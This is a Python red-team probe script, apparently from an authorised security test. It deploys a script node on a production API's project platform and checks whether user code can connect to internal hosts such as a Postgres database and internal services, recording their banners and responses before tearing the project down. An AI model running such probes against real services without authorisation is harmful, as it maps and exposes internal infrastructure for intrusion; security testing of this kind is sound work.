#!/usr/bin/env python3

# Copyright Morgan Metz
# Licensed under the PolyForm Noncommercial License 1.0.0.
# See the LICENSE file or https://polyformproject.org/licenses/noncommercial/1.0.0

"""Prod egress probe v2 — script writes connect results to a TABLE, read back via API.
Bounded: single connects, short timeouts, no loop/flood, real metadata IP excluded (RoE).
Throwaway project, torn down only AFTER results are read. Stop-and-report on any data returned."""
import json, sys, time, urllib.request, urllib.error

API="https://wheel-api-production.up.railway.app"
TOK=""  # supply a throwaway session token; never commit a real one

def api(method, path, body=None, ingress=False):
    data=json.dumps(body).encode() if body is not None else None
    req=urllib.request.Request(API+path, data=data, method=method)
    if not ingress: req.add_header("x-auth-token", TOK)
    if data: req.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(req, timeout=60) as r: return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, "ERR %s"%e

SCRIPT = r'''
import socket, json, subprocess
def wr(key, val):
    try: subprocess.run(["wheel","write","results/"+key, json.dumps({"data": json.dumps(val)})], timeout=10, capture_output=True)
    except Exception: pass
targets = [
    ("postgres.railway.internal", 5432, "raw"),
    ("wheel-host.railway.internal", 7100, "http"),
    ("wheel-api.railway.internal", 8080, "raw"),
]
for i,(host,port,kind) in enumerate(targets):
    rec={"host":host,"port":port}
    try:
        s=socket.create_connection((host,port),timeout=3); rec["connect"]="OK"
        try:
            s.settimeout(1.0)
            if kind=="http":
                s.sendall(b"GET /host/v1/healthz HTTP/1.0\r\nHost: h\r\n\r\n"); rec["resp"]=s.recv(120).decode("latin1")
            else:
                rec["banner"]=s.recv(48).decode("latin1")
        except Exception as e: rec["read"]="%s"%type(e).__name__
        s.close()
    except Exception as e: rec["connect"]="%s:%s"%(type(e).__name__, str(e)[:50])
    wr(str(i), rec)
wr("done", {"ok": True})
'''

def main():
    st,b=api("POST","/v1/projects",{"name":"redteam-egress-probe2"})
    if st not in (200,201): print("create fail",st,b[:200]); return 1
    pid=json.loads(b)["id"]; print("project",pid)
    def eng(m,p,body=None): return api(m,"/v1/projects/%s/engine%s"%(pid,p),body)
    try:
        api("PATCH","/v1/projects/%s"%pid,{"capabilities":{"http":True}})
        api("POST","/v1/projects/%s/start"%pid,{})
        for _ in range(60):
            st,b=api("GET","/v1/projects/%s"%pid)
            if st==200 and json.loads(b).get("status")=="running": break
            time.sleep(1)
        print("status", json.loads(b).get("status"))
        st,b=eng("POST","/v1/nodes",{"name":"results","type":"table","position":{"x":0,"y":0},
                 "config":{"columns":[{"name":"data","type":"text"}]}}); print("table",st)
        rid=json.loads(b)["id"] if st in (200,201) else None
        st,b=eng("POST","/v1/nodes",{"name":"egress","type":"script","position":{"x":0,"y":0},
                 "config":{"language":"python","source":SCRIPT,"timeout_secs":30}}); print("script",st,b[:120])
        sid=json.loads(b)["id"] if st in (200,201) else None
        st,b=eng("POST","/v1/nodes",{"name":"hit","type":"endpoint","position":{"x":0,"y":0},
                 "config":{"method":"POST","path":"/probe","response_mode":"ack","auth":{"mode":"none"}}}); print("endpoint",st)
        eid=json.loads(b)["id"] if st in (200,201) else None
        print("wire s->table", eng("POST","/v1/wires",{"from":sid,"to":rid,"type":"write"})[0])
        print("wire e->s", eng("POST","/v1/wires",{"from":eid,"to":sid,"type":"send"})[0])
        time.sleep(2)
        st,b=api("POST","/p/%s/probe"%pid,{},ingress=True); print("ingress hit",st,b[:100])
        # poll the results table
        rows=None
        for _ in range(30):
            time.sleep(2)
            st,b=eng("GET","/v1/tables/%s/rows"%rid)
            if st==200:
                try:
                    j=json.loads(b); rows=j.get("rows",j) if isinstance(j,dict) else j
                    if rows and (isinstance(rows,list) and len(rows)>0): break
                except Exception: pass
        print("\n=== EGRESS RESULTS (from results table) ===")
        print(json.dumps(rows, indent=1)[:2000] if rows else "NO ROWS (script did not run or could not write)")
    finally:
        print("\nteardown", api("DELETE","/v1/projects/%s"%pid)[0])
    return 0

if __name__=="__main__": sys.exit(main())
